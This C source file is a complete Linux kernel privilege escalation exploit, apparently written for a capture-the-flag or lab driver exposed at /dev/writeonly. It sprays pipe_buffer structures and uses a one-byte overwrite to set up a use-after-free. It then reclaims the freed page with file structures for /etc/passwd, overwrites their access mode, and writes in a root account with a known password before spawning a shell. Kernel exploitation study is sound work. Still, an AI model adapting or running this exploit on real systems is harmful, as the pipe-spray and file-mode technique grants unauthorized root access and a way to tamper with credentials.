#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

/*
    uname -a:
        Linux (none) 6.13.0 #1 SMP PREEMPT_DYNAMIC Tue Mar 25 12:25:20 JST 2025 x86_64 GNU/Linux
    
    Compile flag(s): 
        musl-gcc -static -no-pie exp.c -o exp
*/

/* Helper macros */
#define BLUE   "\033[0;34m"
#define GREEN  "\033[0;32m"
#define RED    "\033[0;31m"
#define RESET  "\033[0m"
#define log_info(fmt, ...) \
    printf("[" BLUE "*" RESET "] " fmt, ##__VA_ARGS__)
#define log_suc(fmt, ...) \
    printf("[" GREEN "+" RESET "] " fmt, ##__VA_ARGS__)
#define log_err(fmt, ...) \
    printf("[" RED "!" RESET "] " fmt, ##__VA_ARGS__)
#define ERR_MSG(FUNC_NAME) \
    perror(#FUNC_NAME); \
    exit(EXIT_FAILURE);
/* ============= */

#define VULN_FILE "/dev/writeonly"
#define W _IOW('A', 1, uint32_t)

typedef unsigned long long u64;
int vuln_fd = -1;

typedef struct request_t {
    u64 size;
    void *data;
} request_t;

void waiting(void);
void open_vuln(void);
void alloc_n_write_to_obj(char *udata, u64 usize);

int main(void) {
    open_vuln();

    /* Overwrite 1 LSB of pipe_buffer->page */
    log_info("Spraying struct pipe_buffer and writing to pipes to alloc pages\n");
    int pipefds[27][2];
    for (int i = 0; i < 24; i++) {
        assert(pipe(pipefds[i]) != -1);

        int val = 0xcafebabe + i;
        assert(write(pipefds[i][1], &val, sizeof(val)) != -1);
        assert(write(pipefds[i][1], "deadbeef", 8) != -1);
    }
    
    /* Close one pipe to reserve slot so we can overflow the next pipe_buffer struct */
    assert(close(pipefds[22][0]) != -1);
    assert(close(pipefds[22][1]) != -1);
    
    log_info("Allocating a victim object from kmalloc-1k\n");
    char ustack[0x400] = {0};
    memset(ustack, 0x41, sizeof(ustack));
    alloc_n_write_to_obj(ustack, sizeof(ustack));

    // waiting();

    /* Writing specific values for easier finding later */
    for (int i = 24; i < 27; i++) {
        assert(pipe(pipefds[i]) != -1);
        
        int val = 0xcafebabe + i;
        assert(write(pipefds[i][1], &val, sizeof(val)) != -1);
        assert(write(pipefds[i][1], "deadbeef", 8) != -1);
    }

    // waiting();

    /* Find the victim pipe */
    log_info("Locating the victim pipe\n");
    int seen[27] = {0};
    memset(seen, 0, sizeof(seen));
    int out = 0;
    int victim_pipefd = -1;
    int origin_pipefd = -1;
    for (int i = 0; i < 27; i++) {
        if (out == 1) { break; }
        int val;
        assert(read(pipefds[i][0], &val, 4) != -1);

        printf("    pipe[%d]: 0x%x\n", i, val);
        for (int j = 0; j < i; j++) {
            if (seen[j] == val) {
                victim_pipefd = i;
                origin_pipefd = j;
                log_suc("Found duplicate value: pipe[%d] (victim) == pipe[%d] (origin) with 0x%x\n",
                        victim_pipefd, origin_pipefd, val);
                out = 1;
            }
        }
        seen[i] = val;
    }
    if (out != 1) {
        log_err("Duplicate pipe not found\n");
        exit(1);
    }

    /* Trigger UAF by closing 1 of the overlapped pipes */
    log_info("Closing the original pipe\n");
    assert(close(pipefds[origin_pipefd][0]) != -1);
    assert(close(pipefds[origin_pipefd][1]) != -1);

    // waiting();

    /* Reclaim the freed page by spraying struct file */
    log_info("Spraying struct file of /etc/passwd\n");
    int filefds[27];
    for (int i = 0; i < 27; i++) {
        filefds[i]= open("/etc/passwd", O_RDONLY);
        assert(filefds[i] != -1);
    }

    /* Carefully only writing 4 bytes into the victim pipe so that f_mode on struct file is overwritten */
    log_info("Overwritting f_mode\n");
    int evil_f_mode = 0x84f801f;
    if (write(pipefds[victim_pipefd][1], &evil_f_mode, 4) == -1) {
        ERR_MSG(write)
    }

    /* Craft our own credential of root */
    char payload[] = "root:$1$deadbeef$j9ep0CjBGivAnD5z6l5rr0:0:0:root:/root:/bin/sh\n";
    log_info("Overwriting /etc/passwd with %s", payload);
    for (int i = 0; i < 27; i++) {
        if (write(filefds[i], payload, sizeof(payload)) != -1) {
            log_suc("Success\n");
            log_suc("You can now log in as root with the password: cafebabe\n");
            char *argv[] = {"/bin/sh", NULL};
            execve(argv[0], argv, NULL);
        } else {
            // printf("[%d] Failed\n", i);
        }
    }
    log_err("Failed\n");

    return EXIT_SUCCESS;
}

void alloc_n_write_to_obj(char *udata, u64 usize) {
    request_t req = { .size = usize, .data = udata};
    int retval = ioctl(vuln_fd, W, &req);
    if (retval != 0) { ERR_MSG(ioctl) }
}

void open_vuln(void) {
    vuln_fd = open(VULN_FILE, O_RDONLY);
    if (vuln_fd < 0) { ERR_MSG(open) }
    log_info("Device opened -- fd = %d\n", vuln_fd);
}

void waiting(void) { puts("Press enter to continue..."); getchar(); }
